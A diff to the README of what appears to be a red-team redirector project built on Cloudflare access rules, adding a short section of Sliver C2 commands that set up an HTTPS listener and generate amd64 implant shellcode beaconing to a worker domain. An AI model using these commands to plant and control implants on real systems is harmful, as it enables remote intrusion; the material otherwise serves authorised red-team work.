@@ -89,6 +89,16 @@ Follow the screenshots in assets folder, but in summary:
 
 4. Create application (self-hosted) rules to protect your listener (in the screenshots I'm using github authentication, but you can use the default "one-time pin". BTW, we only care about the Service-Auth policy since only our redirector need to visit listener url).
 
+## Sliver
+
+```bash
+# modify ~/.sliver/configs/http-c2.json (add header)
+
+profiles new --skip-symbols -b https://127.0.0.1:443 --arch amd64 profileCF
+https -L 127.0.0.1 -l 443
+generate --http <worker.demo.com> --skip-symbols --disable-sgn --format shellcode --arch amd64
+```
+
 ## Todo
 
 - probably need a better README file
